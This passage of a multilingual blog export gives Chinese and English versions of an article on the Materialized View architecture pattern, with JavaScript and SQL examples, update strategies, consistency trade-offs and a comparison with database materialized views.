customerCount: 1, topProducts: [ &#123; productId: &quot;PROD-002&quot;, name: &quot;键盘&quot;, sales: 49.99 &#125;, &#123; productId: &quot;PROD-001&quot;, name: &quot;无线鼠标&quot;, sales: 59.98 &#125; ], lastUpdated: &quot;2019-05-15T14:30:00Z&quot; &#125; 更新策略 此模式支持多种更新方法： 1. 事件驱动更新 &#x2F;&#x2F; 当源数据变更时更新视图 orderService.on(&#39;orderCreated&#39;, async (order) &#x3D;&gt; &#123; await materializedViewService.updateSalesSummary(order); &#125;); productService.on(&#39;productUpdated&#39;, async (product) &#x3D;&gt; &#123; await materializedViewService.refreshProductViews(product); &#125;); 2. 定时更新 &#x2F;&#x2F; 定期刷新 cron.schedule(&#39;0 * * * *&#39;, async () &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); &#125;); 3. 按需更新 &#x2F;&#x2F; 需要时手动刷新 app.post(&#39;&#x2F;admin&#x2F;refresh-views&#39;, async (req, res) &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); res.json(&#123; status: &#39;Views refreshed&#39; &#125;); &#125;); 实现考量 1. 更新时机与频率 根据你的需求选择更新策略： 🔄 更新策略选择实时（事件驱动）：最适合新鲜度至关重要的关键数据。注意如果源数据快速变更可能产生过多开销。 定时（批处理）：适合报表和分析，可接受轻微的过时性。减少系统负载并简化实现。 按需（手动）：适合不常访问的视图，或当你需要明确控制刷新时机时。 2. 数据一致性权衡 Materialized view 引入最终一致性： &#x2F;&#x2F; 示例：处理一致性窗口 class MaterializedViewReader &#123; async getSalesSummary(options &#x3D; &#123;&#125;) &#123; const view &#x3D; await viewStore.get(&#39;sales_summary&#39;); if (options.requireFresh) &#123; const age &#x3D; Date.now() - view.lastUpdated; if (age &gt; options.maxAge) &#123; &#x2F;&#x2F; 触发刷新并等待 await this.refreshView(); return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; return view; &#125; &#125; ⚠️ 一致性考量在视图更新期间，数据可能暂时与源系统不一致。设计你的应用程序以优雅地处理这种情况： 显示最后更新时间戳 为关键操作提供手动刷新选项 使用版本控制来检测过时数据 3. 存储位置策略 视图不需要与源数据位于同一个存储中： graph TD A[事务数据库] -->|提取| D[视图构建器] B[文档存储] -->|提取| D C[外部 API] -->|提取| D D -->|存储| E[缓存层] D -->|存储| F[搜索引擎] D -->|存储| G[分析数据库] style D fill:#ffd43b,stroke:#fab005 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 存储选项： 内存缓存（Redis、Memcached）：超快速访问，易失性 搜索引擎（Elasticsearch）：全文搜索能力 分析数据库（ClickHouse、TimescaleDB）：针对聚合优化 对象存储：大型、不常访问视图的成本效益选择 4. 视图优化技术 通过策略性设计最大化视图价值： &#x2F;&#x2F; 包含计算值 &#123; category: &quot;电子产品&quot;, totalSales: 109.97, averageOrderValue: 54.99, &#x2F;&#x2F; 预先计算 growthRate: 0.15, &#x2F;&#x2F; 预先计算 vs. 前期 topProducts: [...], &#x2F;&#x2F; 包含经常联结的数据 categoryMetadata: &#123; name: &quot;电子产品&quot;, description: &quot;电子设备和配件&quot; &#125; &#125; 优化策略： 为 materialized view 添加索引以加快查询 包含计算列以避免运行时计算 反规范化经常联结的数据 以查询友好的格式存储数据（例如，文档查询使用 JSON） 何时使用此模式 理想场景 ✅ 完美使用案例复杂查询需求：当查询需要多个联结、聚合或转换，且实时计算成本高昂时。 跨系统聚合：当组合来自多个数据库、微服务或外部系统的数据时。 报表和分析：当生成仪表板、报表或分析，且不需要实时准确性时。 Event Sourcing 系统：当查询当前状态的唯一方法是重放所有事件时。 次要优势 📋 额外优势简化查询：以不需要深入了解源系统的格式公开复杂数据。 安全性与隐私：提供过滤视图，排除敏感数据同时维持查询能力。 离线场景：为离线访问或偶尔连接的系统在本地缓存视图。 性能隔离：防止繁重的分析查询影响事务系统。 何时避免 ❌ 不适合的情况简单数据结构：源数据已经是容易查询的格式。 高一致性需求：应用程序无法容忍任何数据过时性。 快速变更的数据：源数据变更如此频繁，以至于视图总是过时的。 有限的查询模式：只需要少数简单查询，使开销不合理。 架构质量属性 性能效率 此模式大幅改善查询性能： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_b7421856a')); var option = { \"title\": { \"text\": \"查询响应时间比较\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"直接查询\", \"Materialized View\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"简单\", \"中等\", \"复杂\", \"非常复杂\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"响应时间 (ms)\" }, \"series\": [ { \"name\": \"直接查询\", \"type\": \"bar\", \"data\": [50, 250, 1500, 5000], \"itemStyle\": { \"color\": \"#fa5252\" } }, { \"name\": \"Materialized View\", \"type\": \"bar\", \"data\": [10, 15, 20, 25], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 优势： 在查询时消除昂贵的联结和聚合 通过提供预先计算的结果减少数据库负载 无论数据量如何都能实现可预测的查询性能 可扩展性 Materialized view 支持水平扩展： 读取扩展：跨多个节点复制视图 写入隔离：将读取密集的分析与写入密集的事务分离 资源优化：为不同的访问模式使用专门的存储 成本优化 虽然需要额外的存储，但此模式可以降低整体成本： 减少计算：查询处理所需的 CPU 周期更少 降低数据库负载：减少对昂贵数据库实例的需求 分层存储：为不常访问的视图使用具成本效益的存储 实际实现示例 这是一个销售分析系统的完整实现： class SalesAnalyticsView &#123; constructor(orderDb, productDb, customerDb, viewStore) &#123; this.orderDb &#x3D; orderDb; this.productDb &#x3D; productDb; this.customerDb &#x3D; customerDb; this.viewStore &#x3D; viewStore; &#125; async rebuildView() &#123; &#x2F;&#x2F; 从多个源提取数据 const orders &#x3D; await this.orderDb.getOrders(); const products &#x3D; await this.productDb.getProducts(); const customers &#x3D; await this.customerDb.getCustomers(); &#x2F;&#x2F; 转换和聚合 const summary &#x3D; this.computeSummary(orders, products, customers); &#x2F;&#x2F; 以元数据存储 await this.viewStore.save(&#39;sales_analytics&#39;, &#123; data: summary, lastUpdated: new Date(), version: this.generateVersion() &#125;); &#125; computeSummary(orders, products, customers) &#123; const productMap &#x3D; new Map(products.map(p &#x3D;&gt; [p.id, p])); const customerMap &#x3D; new Map(customers.map(c &#x3D;&gt; [c.id, c])); const summary &#x3D; &#123;&#125;; for (const order of orders) &#123; for (const item of order.items) &#123; const product &#x3D; productMap.get(item.productId); const category &#x3D; product.category; if (!summary[category]) &#123; summary[category] &#x3D; &#123; totalSales: 0, orderCount: 0, customers: new Set() &#125;; &#125; summary[category].totalSales +&#x3D; item.quantity * item.price; summary[category].orderCount++; summary[category].customers.add(order.customerId); &#125; &#125; &#x2F;&#x2F; 转换为最终格式 return Object.entries(summary).map(([category, data]) &#x3D;&gt; (&#123; category, totalSales: data.totalSales, orderCount: data.orderCount, customerCount: data.customers.size &#125;)); &#125; async getView() &#123; return await this.viewStore.get(&#39;sales_analytics&#39;); &#125; &#125; 权衡与考量 像任何架构模式一样，materialized view 涉及权衡： ⚠️ 需要解决的挑战存储开销：视图消耗额外的存储空间，可能重复数据。 更新复杂性：管理视图更新增加操作复杂性和潜在的失败点。 一致性窗口：应用程序必须处理视图不反映最新源数据的期间。 维护负担：视图需要监控、版本控制和偶尔的重建。 缓解策略： 实现视图版本控制以处理架构变更 监控视图新鲜度并在数据过时时发出警报 自动化视图重建和验证 记录每个视图的一致性保证 相关模式 Materialized View 模式与其他架构模式配合良好： CQRS（命令查询责任分离）：使用 materialized view 作为查询端，并为写入使用独立的命令模型 Event Sourcing：通过处理事件流来构建 materialized view 以衍生当前状态 Index Table 模式：在 materialized view 上创建次要索引以支持额外的查询模式 Cache-Aside：将 materialized view 视为具有明确刷新逻辑的特殊缓存 结论 Materialized View 模式解决了数据密集系统中的一个基本挑战：数据存储方式与查询需求之间的不匹配。通过预先计算并存储查询结果，它提供： 复杂查询的显著性能改善 减少源系统的负载 跨多个源聚合数据的灵活性 为应用程序开发人员简化查询 虽然它在一致性和存储开销方面引入了权衡，但这些成本通常被它提供的性能提升和架构灵活性所证明是合理的。当你的系统在复杂查询上遇到困难、需要跨多个源聚合数据，或需要高性能分析而不影响事务工作负载时，请考虑此模式。 成功的关键：将 materialized view 视为可抛弃的、自动化的产物，可以随时从源数据重建。这种心态让你可以自由地实验不同的视图结构和更新策略，直到找到最适合你特定需求的平衡。 参考资料 Enterprise Integration Patterns: Materialized View Microsoft Learn: Materialized View Pattern Martin Fowler: CQRS","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Data Management","slug":"Data-Management","permalink":"https://neo01.com/tags/Data-Management/"},{"name":"Performance","slug":"Performance","permalink":"https://neo01.com/tags/Performance/"}],"lang":"zh-CN"},{"title":"Materialized View 模式：透過預先計算的資料優化查詢效能","slug":"2019/05/Materialized-View-Pattern-zh-TW","date":"un11fin11","updated":"un22fin22","comments":true,"path":"/zh-TW/2019/05/Materialized-View-Pattern/","permalink":"https://neo01.com/zh-TW/2019/05/Materialized-View-Pattern/","excerpt":"了解 Materialized View 模式如何透過預先計算並以特定查詢優化的格式儲存資料來提升查詢效能，以及它與資料庫 materialized view 的差異。","text":"當你走進圖書館時，你不會期望圖書館員在每次你詢問特定類型的書籍時，都重新整理所有的書。相反地，圖書館維護著一個目錄——一個預先計算的索引，讓找書變得快速且有效率。Materialized View 模式將同樣的原則應用於資料系統：在問題被提出之前就準備好答案。 問題：儲存格式 vs. 查詢需求 當開發人員和資料管理員設計資料儲存時，他們通常專注於資料如何被寫入和維護，而非如何被讀取。這完全合理——儲存格式針對以下方面進行優化： 資料完整性：確保一致性並避免重複 寫入效率：快速插入和更新 儲存優化：最小化空間使用 關聯管理：維護實體之間的連接 然而，這種儲存優先的方法經常與查詢需求產生不匹配。考慮一個電子商務系統，將訂單儲存在正規化的關聯式資料庫中，或作為文件聚合儲存在 NoSQL 儲存中。雖然這種結構對於記錄交易運作良好，但當你需要回答以下問題時就會出現問題： 「本月各產品類別的總銷售額是多少？」 「哪些客戶的終身價值最高？」 「各地區的平均訂單處理時間是多少？」 ⚠️ 查詢效能問題要回答這些問題，系統必須掃描數千筆記錄，執行複雜的聯結或聚合，並即時計算數值。這個過程消耗大量資源和時間，特別是隨著資料量增長。 解決方案：預先計算並儲存查詢結果 Materialized View 模式透過產生並儲存針對特定查詢優化格式的資料來解決這個挑戰。系統不再每次查詢執行時都計算結果，而是： 識別常見的查詢模式，這些模式需要複雜的計算 預先計算結果，透過轉換來源資料 儲存結果，以優化快速檢索的格式 更新視圖，當來源資料變更時 graph LR A[來源資料儲存] -->|轉換與聚合| B[Materialized View] C[應用程式查詢] -->|快速讀取| B A -->|資料變更| D[更新程序] D -->|重新整理| B style B fill:#51cf66,stroke:#2f9e44 style A fill:#4dabf7,stroke:#1971c2 關鍵洞察：materialized view 是完全可拋棄的。它可以完全從來源資料重建，使其成為一種特殊形式的快取，儲存計算結果而非原始資料。 資料庫 Materialized View vs. 此模式 在深入探討之前，讓我們釐清一個重要的區別：資料庫 materialized view 和 Materialized View 模式是相關但不同的概念。 資料庫 Materialized View 許多關聯式資料庫（PostgreSQL、Oracle、SQL Server）提供內建的 materialized view 功能： -- 資料庫 materialized view 範例 CREATE MATERIALIZED VIEW sales_summary AS SELECT product_category, SUM(order_total) as total_sales, COUNT(DISTINCT customer_id) as customer_count FROM orders JOIN order_items ON orders.id &#x3D; order_items.order_id JOIN products ON order_items.product_id &#x3D; products.id GROUP BY product_category; -- 重新整理視圖 REFRESH MATERIALIZED VIEW sales_summary; 特性： 由資料庫引擎管理 儲存在同一個資料庫內 使用資料庫特定的重新整理機制 通常支援增量更新 限於單一資料庫範圍 Materialized View 模式 架構模式將這個概念擴展到資料庫邊界之外： &#x2F;&#x2F; 模式實作範例 class MaterializedViewService &#123; async updateSalesSummary() &#123; &#x2F;&#x2F; 從多個來源讀取 const orders &#x3D; await orderDatabase.query(&#39;SELECT * FROM orders&#39;); const customers &#x3D; await customerDatabase.query(&#39;SELECT * FROM customers&#39;); const products &#x3D; await productCatalog.getAll(); &#x2F;&#x2F; 轉換和聚合 const summary &#x3D; this.computeSummary(orders, customers, products); &#x2F;&#x2F; 以優化格式儲存 await viewStore.save(&#39;sales_summary&#39;, summary); &#125; async getSalesSummary() &#123; return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; 特性： 應用程式管理的邏輯 可以聚合來自多個來源的資料 儲存在任何資料儲存中（與來源不同） 靈活的更新策略 跨分散式系統運作 主要差異 面向 資料庫 Materialized View Materialized View 模式 範圍 單一資料庫 多個資料來源 管理 資料庫引擎 應用程式程式碼 儲存 同一個資料庫 任何資料儲存 技術 資料庫特定 技術無關 使用案例 資料庫內查詢優化 跨系統資料聚合 📊 何時使用哪一種使用資料庫 materialized view，當在單一資料庫系統內優化查詢時。 使用 Materialized View 模式，當跨多個系統、微服務或異質資料儲存聚合資料時。 運作方式：模式實踐 讓我們探索一個具體範例：一個需要顯示產品銷售摘要的電子商務平台。 來源資料結構 系統將資料儲存在針對不同目的優化的獨立位置： &#x2F;&#x2F; 訂單儲存在交易資料庫 &#123; orderId: &quot;ORD-12345&quot;, customerId: &quot;CUST-789&quot;, orderDate: &quot;2019-05-15&quot;, items: [ &#123; productId: &quot;PROD-001&quot;, quantity: 2, price: 29.99 &#125;, &#123; productId: &quot;PROD-002&quot;, quantity: 1, price: 49.99 &#125; ] &#125; &#x2F;&#x2F; 產品儲存在目錄服務 &#123; productId: &quot;PROD-001&quot;, name: &quot;無線滑鼠&quot;, category: &quot;電子產品&quot; &#125; &#x2F;&#x2F; 客戶儲存在 CRM 系統 &#123; customerId: &quot;CUST-789&quot;, name: &quot;王小明&quot;, segment: &quot;高級會員&quot; &#125; Materialized View 結構 視圖將這些資料組合並轉換為查詢優化格式： &#x2F;&#x2F; 銷售摘要的 materialized view &#123; category: &quot;電子產品&quot;, totalSales: 109.97, orderCount: 1, customerCount: 1, topProducts: [ &#123; productId: &quot;PROD-002&quot;, name: &quot;鍵盤&quot;, sales: 49.99 &#125;, &#123; productId: &quot;PROD-001&quot;, name: &quot;無線滑鼠&quot;, sales: 59.98 &#125; ], lastUpdated: &quot;2019-05-15T14:30:00Z&quot; &#125; 更新策略 此模式支援多種更新方法： 1. 事件驅動更新 &#x2F;&#x2F; 當來源資料變更時更新視圖 orderService.on(&#39;orderCreated&#39;, async (order) &#x3D;&gt; &#123; await materializedViewService.updateSalesSummary(order); &#125;); productService.on(&#39;productUpdated&#39;, async (product) &#x3D;&gt; &#123; await materializedViewService.refreshProductViews(product); &#125;); 2. 排程更新 &#x2F;&#x2F; 定期重新整理 cron.schedule(&#39;0 * * * *&#39;, async () &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); &#125;); 3. 按需更新 &#x2F;&#x2F; 需要時手動重新整理 app.post(&#39;&#x2F;admin&#x2F;refresh-views&#39;, async (req, res) &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); res.json(&#123; status: &#39;Views refreshed&#39; &#125;); &#125;); 實作考量 1. 更新時機與頻率 根據你的需求選擇更新策略： 🔄 更新策略選擇即時（事件驅動）：最適合新鮮度至關重要的關鍵資料。注意如果來源資料快速變更可能產生過多開銷。 排程（批次）：適合報表和分析，可接受輕微的過時性。減少系統負載並簡化實作。 按需（手動）：適合不常存取的視圖，或當你需要明確控制重新整理時機時。 2. 資料一致性權衡 Materialized view 引入最終一致性： &#x2F;&#x2F; 範例：處理一致性視窗 class MaterializedViewReader &#123; async getSalesSummary(options &#x3D; &#123;&#125;) &#123; const view &#x3D; await viewStore.get(&#39;sales_summary&#39;); if (options.requireFresh) &#123; const age &#x3D; Date.now() - view.lastUpdated; if (age &gt; options.maxAge) &#123; &#x2F;&#x2F; 觸發重新整理並等待 await this.refreshView(); return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; return view; &#125; &#125; ⚠️ 一致性考量在視圖更新期間，資料可能暫時與來源系統不一致。設計你的應用程式以優雅地處理這種情況： 顯示最後更新時間戳記 為關鍵操作提供手動重新整理選項 使用版本控制來偵測過時資料 3. 儲存位置策略 視圖不需要與來源資料位於同一個儲存中： graph TD A[交易資料庫] -->|提取| D[視圖建構器] B[文件儲存] -->|提取| D C[外部 API] -->|提取| D D -->|儲存| E[快取層] D -->|儲存| F[搜尋引擎] D -->|儲存| G[分析資料庫] style D fill:#ffd43b,stroke:#fab005 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 儲存選項： 記憶體快取（Redis、Memcached）：超快速存取，易失性 搜尋引擎（Elasticsearch）：全文搜尋能力 分析資料庫（ClickHouse、TimescaleDB）：針對聚合優化 物件儲存：大型、不常存取視圖的成本效益選擇 4. 視圖優化技術 透過策略性設計最大化視圖價值： &#x2F;&#x2F; 包含計算值 &#123; category: &quot;電子產品&quot;, totalSales: 109.97, averageOrderValue: 54.99, &#x2F;&#x2F; 預先計算 growthRate: 0.15, &#x2F;&#x2F; 預先計算 vs. 前期 topProducts: [...], &#x2F;&#x2F; 包含經常聯結的資料 categoryMetadata: &#123; name: &quot;電子產品&quot;, description: &quot;電子裝置和配件&quot; &#125; &#125; 優化策略： 為 materialized view 新增索引以加快查詢 包含計算欄位以避免執行時期計算 反正規化經常聯結的資料 以查詢友善的格式儲存資料（例如，文件查詢使用 JSON） 何時使用此模式 理想情境 ✅ 完美使用案例複雜查詢需求：當查詢需要多個聯結、聚合或轉換，且即時計算成本高昂時。 跨系統聚合：當組合來自多個資料庫、微服務或外部系統的資料時。 報表和分析：當產生儀表板、報表或分析，且不需要即時準確性時。 Event Sourcing 系統：當查詢目前狀態的唯一方法是重播所有事件時。 次要優勢 📋 額外優勢簡化查詢：以不需要深入了解來源系統的格式公開複雜資料。 安全性與隱私：提供過濾視圖，排除敏感資料同時維持查詢能力。 離線情境：為離線存取或偶爾連線的系統在本地快取視圖。 效能隔離：防止繁重的分析查詢影響交易系統。 何時避免 ❌ 不適合的情況簡單資料結構：來源資料已經是容易查詢的格式。 高一致性需求：應用程式無法容忍任何資料過時性。 快速變更的資料：來源資料變更如此頻繁，以至於視圖總是過時的。 有限的查詢模式：只需要少數簡單查詢，使開銷不合理。 架構品質屬性 效能效率 此模式大幅改善查詢效能： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_6fa5f2b0e')); var option = { \"title\": { \"text\": \"查詢回應時間比較\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"直接查詢\", \"Materialized View\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"簡單\", \"中等\", \"複雜\", \"非常複雜\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"回應時間 (ms)\" }, \"series\": [ { \"name\": \"直接查詢\", \"type\": \"bar\", \"data\": [50, 250, 1500, 5000], \"itemStyle\": { \"color\": \"#fa5252\" } }, { \"name\": \"Materialized View\", \"type\": \"bar\", \"data\": [10, 15, 20, 25], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 優勢： 在查詢時消除昂貴的聯結和聚合 透過提供預先計算的結果減少資料庫負載 無論資料量如何都能實現可預測的查詢效能 可擴展性 Materialized view 支援水平擴展： 讀取擴展：跨多個節點複製視圖 寫入隔離：將讀取密集的分析與寫入密集的交易分離 資源優化：為不同的存取模式使用專門的儲存 成本優化 雖然需要額外的儲存，但此模式可以降低整體成本： 減少運算：查詢處理所需的 CPU 週期更少 降低資料庫負載：減少對昂貴資料庫實例的需求 分層儲存：為不常存取的視圖使用具成本效益的儲存 實際實作範例 這是一個銷售分析系統的完整實作： class SalesAnalyticsView &#123; constructor(orderDb, productDb, customerDb, viewStore) &#123; this.orderDb &#x3D; orderDb; this.productDb &#x3D; productDb; this.customerDb &#x3D; customerDb; this.viewStore &#x3D; viewStore; &#125; async rebuildView() &#123; &#x2F;&#x2F; 從多個來源提取資料 const orders &#x3D; await this.orderDb.getOrders(); const products &#x3D; await this.productDb.getProducts(); const customers &#x3D; await this.customerDb.getCustomers(); &#x2F;&#x2F; 轉換和聚合 const summary &#x3D; this.computeSummary(orders, products, customers); &#x2F;&#x2F; 以中繼資料儲存 await this.viewStore.save(&#39;sales_analytics&#39;, &#123; data: summary, lastUpdated: new Date(), version: this.generateVersion() &#125;); &#125; computeSummary(orders, products, customers) &#123; const productMap &#x3D; new Map(products.map(p &#x3D;&gt; [p.id, p])); const customerMap &#x3D; new Map(customers.map(c &#x3D;&gt; [c.id, c])); const summary &#x3D; &#123;&#125;; for (const order of orders) &#123; for (const item of order.items) &#123; const product &#x3D; productMap.get(item.productId); const category &#x3D; product.category; if (!summary[category]) &#123; summary[category] &#x3D; &#123; totalSales: 0, orderCount: 0, customers: new Set() &#125;; &#125; summary[category].totalSales +&#x3D; item.quantity * item.price; summary[category].orderCount++; summary[category].customers.add(order.customerId); &#125; &#125; &#x2F;&#x2F; 轉換為最終格式 return Object.entries(summary).map(([category, data]) &#x3D;&gt; (&#123; category, totalSales: data.totalSales, orderCount: data.orderCount, customerCount: data.customers.size &#125;)); &#125; async getView() &#123; return await this.viewStore.get(&#39;sales_analytics&#39;); &#125; &#125; 權衡與考量 像任何架構模式一樣，materialized view 涉及權衡： ⚠️ 需要解決的挑戰儲存開銷：視圖消耗額外的儲存空間，可能重複資料。 更新複雜性：管理視圖更新增加操作複雜性和潛在的失敗點。 一致性視窗：應用程式必須處理視圖不反映最新來源資料的期間。 維護負擔：視圖需要監控、版本控制和偶爾的重建。 緩解策略： 實作視圖版本控制以處理架構變更 監控視圖新鮮度並在資料過時時發出警報 自動化視圖重建和驗證 記錄每個視圖的一致性保證 相關模式 Materialized View 模式與其他架構模式配合良好： CQRS（命令查詢責任分離）：使用 materialized view 作為查詢端，並為寫入使用獨立的命令模型 Event Sourcing：透過處理事件串流來建構 materialized view 以衍生目前狀態 Index Table 模式：在 materialized view 上建立次要索引以支援額外的查詢模式 Cache-Aside：將 materialized view 視為具有明確重新整理邏輯的特殊快取 結論 Materialized View 模式解決了資料密集系統中的一個基本挑戰：資料儲存方式與查詢需求之間的不匹配。透過預先計算並儲存查詢結果，它提供： 複雜查詢的顯著效能改善 減少來源系統的負載 跨多個來源聚合資料的靈活性 為應用程式開發人員簡化查詢 雖然它在一致性和儲存開銷方面引入了權衡，但這些成本通常被它提供的效能提升和架構靈活性所證明是合理的。當你的系統在複雜查詢上遇到困難、需要跨多個來源聚合資料，或需要高效能分析而不影響交易工作負載時，請考慮此模式。 成功的關鍵：將 materialized view 視為可拋棄的、自動化的產物，可以隨時從來源資料重建。這種心態讓你可以自由地實驗不同的視圖結構和更新策略，直到找到最適合你特定需求的平衡。 參考資料 Enterprise Integration Patterns: Materialized View Microsoft Learn: Materialized View Pattern Martin Fowler: CQRS","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Data Management","slug":"Data-Management","permalink":"https://neo01.com/tags/Data-Management/"},{"name":"Performance","slug":"Performance","permalink":"https://neo01.com/tags/Performance/"}],"lang":"zh-TW"},{"title":"Materialized View Pattern: Optimizing Query Performance Through Precomputed Data","slug":"2019/05/Materialized-View-Pattern","date":"un11fin11","updated":"un22fin22","comments":true,"path":"/2019/05/Materialized-View-Pattern/","permalink":"https://neo01.com/2019/05/Materialized-View-Pattern/","excerpt":"Learn how the Materialized View pattern improves query performance by precomputing and storing data in formats optimized for specific queries, and how it differs from database materialized views.","text":"When you walk into a library, you don’t expect the librarian to reorganize all the books every time you ask for a specific genre. Instead, the library maintains a catalog—a precomputed index that makes finding books fast and efficient. The Materialized View pattern applies this same principle to data systems: prepare the answers before the questions are asked. The Problem: Storage Format vs. Query Needs When developers and data administrators design data storage, they typically focus on how data is written and maintained rather than how it will be read. This makes perfect sense—storage formats are optimized for: Data integrity: Ensuring consistency and avoiding duplication Write efficiency: Fast inserts and updates Storage optimization: Minimizing space usage Relationship management: Maintaining connections between entities However, this storage-first approach often creates a mismatch with query requirements. Consider an e-commerce system storing orders in a normalized relational database or as document aggregates in a NoSQL store. While this structure works well for recording transactions, it becomes problematic when you need to answer questions like: “What’s the total sales value by product category this month?” “Which customers have the highest lifetime value?” “What’s the average order processing time by region?” ⚠️ The Query Performance ProblemTo answer these questions, the system must scan thousands of records, perform complex joins or aggregations, and compute values on the fly. This process consumes significant resources and time, especially as data volume grows. The Solution: Precompute and Store Query Results The Materialized View pattern addresses this challenge by generating and storing data in formats optimized for specific queries. Instead of computing results every time a query runs, the system: Identifies common query patterns that require complex computations Precomputes the results by transforming source data Stores the results in a format optimized for fast retrieval Updates the view when source data changes graph LR A[Source Data Store] -->|Transform & Aggregate| B[Materialized View] C[Application Query] -->|Fast Read| B A -->|Data Changes| D[Update Process] D -->|Refresh| B style B fill:#51cf66,stroke:#2f9e44 style A fill:#4dabf7,stroke:#1971c2 The key insight: a materialized view is completely disposable. It can be rebuilt entirely from source data, making it a specialized form of cache that stores computed results rather than raw data. Database Materialized Views vs. The Pattern Before diving deeper, let’s clarify an important distinction: database materialized views and the Materialized View pattern are related but different concepts. Database Materialized Views Many relational databases (PostgreSQL, Oracle, SQL Server) provide built-in materialized view features: -- Database materialized view example CREATE MATERIALIZED VIEW sales_summary AS SELECT product_category, SUM(order_total) as total_sales, COUNT(DISTINCT customer_id) as customer_count FROM orders JOIN order_items ON orders.id &#x3D; order_items.order_id JOIN products ON order_items.product_id &#x3D; products.id GROUP BY product_category; -- Refresh the view REFRESH MATERIALIZED VIEW sales_summary; Characteristics: Managed by the database engine Stored within the same database Uses database-specific refresh mechanisms Typically supports incremental updates Limited to single database scope The Materialized View Pattern The architectural pattern extends this concept beyond database boundaries: &#x2F;&#x2F; Pattern implementation example class MaterializedViewService &#123; async updateSalesSummary() &#123; &#x2F;&#x2F; Read from multiple sources const orders &#x3D; await orderDatabase.query(&#39;SELECT * FROM orders&#39;); const customers &#x3D; await customerDatabase.query(&#39;SELECT * FROM customers&#39;); const products &#x3D; await productCatalog.getAll(); &#x2F;&#x2F; Transform and aggregate const summary &#x3D; this.computeSummary(orders, customers, products); &#x2F;&#x2F; Store in optimized format await viewStore.save(&#39;sales_summary&#39;, summary); &#125; async getSalesSummary() &#123; return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; Characteristics: Application-managed logic Can aggregate data from multiple sources Stored in any data store (different from source) Flexible update strategies Works across distributed systems Key Differences Aspect Database Materialized View Materialized View Pattern Scope Single database Multiple data sources Management Database engine Application code Storage Same database Any data store Technology Database-specific Technology-agnostic Use Case Query optimization within DB Cross-system data aggregation 📊 When to Use WhichUse database materialized views when optimizing queries within a single database system. Use the Materialized View pattern when aggregating data across multiple systems, microservices, or heterogeneous data stores. How It Works: Pattern in Practice Let’s explore a concrete example: an e-commerce platform that needs to display product sales summaries. Source Data Structure The system stores data in separate locations optimized for different purposes: &#x2F;&#x2F; Orders stored in transactional database &#123; orderId: &quot;ORD-12345&quot;, customerId: &quot;CUST-789&quot;, orderDate: &quot;2019-05-15&quot;, items: [ &#123; productId: &quot;PROD-001&quot;, quantity: 2, price: 29.99 &#125;, &#123; productId: &quot;PROD-002&quot;, quantity: 1, price: 49.99 &#125; ] &#125; &#x2F;&#x2F; Products stored in catalog service &#123; productId: &quot;PROD-001&quot;, name: &quot;Wireless Mouse&quot;, category: &quot;Electronics&quot; &#125; &#x2F;&#x2F; Customers stored in CRM system &#123; customerId: &quot;CUST-789&quot;, name: &quot;John Doe&quot;, segment: &quot;Premium&quot; &#125; Materialized View Structure The view combines and transforms this data into a query-optimized format: &#x2F;&#x2F; Materialized view for sales summary &#123; category: &quot;Electronics&quot;, totalSales: 109.97, orderCount: 1, customerCount: 1, topProducts: [ &#123; productId: &quot;PROD-002&quot;, name: &quot;Keyboard&quot;, sales: 49.99 &#125;, &#123; productId: &quot;PROD-001&quot;, name: &quot;Wireless Mouse&quot;, sales: 59.98 &#125; ], lastUpdated: &quot;2019-05-15T14:30:00Z&quot; &#125; Update Strategies The pattern supports multiple update approaches: 1. Event-Driven Updates &#x2F;&#x2F; Update view when source data changes orderService.on(&#39;orderCreated&#39;, async (order) &#x3D;&gt; &#123; await materializedViewService.updateSalesSummary(order); &#125;); productService.on(&#39;productUpdated&#39;, async (product) &#x3D;&gt; &#123; await materializedViewService.refreshProductViews(product); &#125;); 2. Scheduled Updates &#x2F;&#x2F; Periodic refresh cron.schedule(&#39;0 * * * *&#39;, async () &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); &#125;); 3. On-Demand Updates &#x2F;&#x2F; Manual refresh when needed app.post(&#39;&#x2F;admin&#x2F;refresh-views&#39;, async (req, res) &#x3D;&gt; &#123; await materializedViewService.rebuildAllViews(); res.json(&#123; status: &#39;Views refreshed&#39; &#125;); &#125;); Implementation Considerations 1. Update Timing and Frequency Choose an update strategy based on your requirements: 🔄 Update Strategy SelectionReal-time (Event-Driven): Best for critical data where freshness is paramount. Watch for excessive overhead if source data changes rapidly. Scheduled (Batch): Ideal for reporting and analytics where slight staleness is acceptable. Reduces system load and simplifies implementation. On-Demand (Manual): Suitable for infrequently accessed views or when you need explicit control over refresh timing. 2. Data Consistency Trade-offs Materialized views introduce eventual consistency: &#x2F;&#x2F; 